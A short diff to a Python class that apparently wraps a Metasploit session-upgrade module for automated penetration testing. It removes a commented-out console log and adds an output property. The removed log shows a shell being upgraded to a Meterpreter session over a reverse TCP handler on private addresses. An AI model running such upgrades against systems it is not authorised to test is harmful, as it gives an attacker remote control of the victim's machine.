@@ -51,19 +51,6 @@ class UpgradeSession(Action):
         }
         super().__init__(message_id, template, caller_id, external_resources)
 
-
-# [-] The following options failed to validate: Value 'None' is not valid for option 'LHOST'.
-# LHOST => 10.0.0.2
-# SESSION => 1
-# [!] SESSION may not be compatible with this module:
-# [!]  * incompatible session platform: python. This module works with: Linux, OSX, Unix, Solaris, BSD, Windows.
-# [*] Upgrading session ID: 1
-# [*] Starting exploit/multi/handler
-# [*] Started reverse TCP handler on 10.0.0.2:4433
-# [*] Sending stage (1017704 bytes) to 10.0.0.1
-# [*] Meterpreter session 4 opened (10.0.0.2:4433 -> 10.0.0.1:41886) at 2024-06-17 11:55:52 +0000
-# [*] Command stager progress: 100.00% (773/773 bytes)
-# [*] Post module execution completed
-# y6KkpAM9t5v34r49Gdzd
-
-# {'session_id': 4}
+    @property
+    def processed_output(self):
+        return self.output
